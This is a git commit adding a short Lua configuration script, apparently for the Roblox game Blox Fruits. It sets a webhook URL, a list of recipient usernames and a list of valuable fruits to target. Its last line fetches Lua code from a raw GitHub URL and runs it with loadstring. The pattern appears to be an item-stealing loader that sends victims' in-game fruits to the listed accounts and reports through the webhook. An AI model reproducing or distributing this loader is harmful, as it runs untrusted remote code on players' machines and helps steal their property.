be5a4cb4aaa82d35fd846a3d0c22280133fc6df2
reditz-cm <sistema2627@gmail.com>
2025-04-01 18:26:59 -0500

    source.lua

---
+++ source.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=VTh0bFNBNFRUN1hEQS1hUTQzM2ZlZzphMWdLaXc4V2lQNUFGekkxSm1nYncwZ0w4UXpqVzRXUTh6UlR1aGZLNDdnM2MzWVZ5dktRb3I0Yzc5WWhhb2xoUUJDWk9IU0dtR0hrNUtjVzZmWTRxUl9jdXRNS0FFbzRTTmZPZkVOclktQTMtWjIzdkpmVTZneG8xaVFwbjRTYmd6aGRqRU1KS2tGNnVNRzUzM1FyY3V0S0wzSVhyVzR2b3JrSHdERGZWVlE" -- << Your Webhook
+Usernames = {"xXFixerXx1", "somealtuserhere2"} -- << Your username(-s).
+FruitsToHit = {"Dragon", "West Dragon",  "East Dradon",  "Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
